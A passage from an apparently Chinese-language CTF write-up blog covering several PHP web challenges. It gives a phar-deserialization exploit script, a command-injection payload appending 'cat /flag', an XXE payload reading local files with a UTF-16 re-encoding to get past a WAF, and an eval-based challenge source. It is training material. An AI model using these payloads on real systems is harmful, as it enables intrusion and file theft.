<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files,<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exp.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把exp.phar传上去，改下content-type为图片类型的，然后点删除，抓包用phar:&#x2F;&#x2F;访问文件名就可以getflag了</p>
<p><img src="/images/image-20240109172415125.png" alt="image-20240109172415125"></p>
<h1 id="181-SWPUCTF-2023-秋季新生赛-Pingpingping"><a href="#181-SWPUCTF-2023-秋季新生赛-Pingpingping" class="headerlink" title="181.[SWPUCTF 2023 秋季新生赛]Pingpingping"></a>181.[SWPUCTF 2023 秋季新生赛]Pingpingping</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$_ping</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Ping_ip.exe&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_ping</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 3 &quot;</span>.<span class="variable">$_ping</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;error.png&quot;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下划线无法解释，要用[来代替，在php中，变量名只有数字字母下划线，从get&#x2F;post传入的，如果含有空格、+、[则会被转化为<code>_</code>，如果传入[，被转化为<code>_</code>后就不会被替换掉</p>
<p>payload:<code>?Ping[ip.exe;cat /flag</code></p>
<h1 id="182-CSAWQual-2019-Unagi"><a href="#182-CSAWQual-2019-Unagi" class="headerlink" title="182.[CSAWQual 2019]Unagi"></a>182.[CSAWQual 2019]Unagi</h1><p>查看user.php，用户信息存在4个字段：name、email、group、intro；upload.php中可以上传xml文件，样例格式如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>少了intro字段，那么考虑在intro里回显，插入xxe的poc</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完整文件如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传发现被waf，使用UTF16编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF16BE xxe.xml&gt;xxe2.xml</span><br></pre></td></tr></table></figure>

<p>上传后getflag</p>
<h1 id="183-HNCTF-2022-Week1-Challenge-rce"><a href="#183-HNCTF-2022-Week1-Challenge-rce" class="headerlink" title="183.[HNCTF 2022 Week1]Challenge__rce"></a>183.[HNCTF 2022 Week1]Challenge__rce</h1><p>F12发现要传hint参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁了大量特殊符号。无字母数字rce的异或与取反都被ban了，可以写一个根据waf的正则输出合法字符的脚本</p>
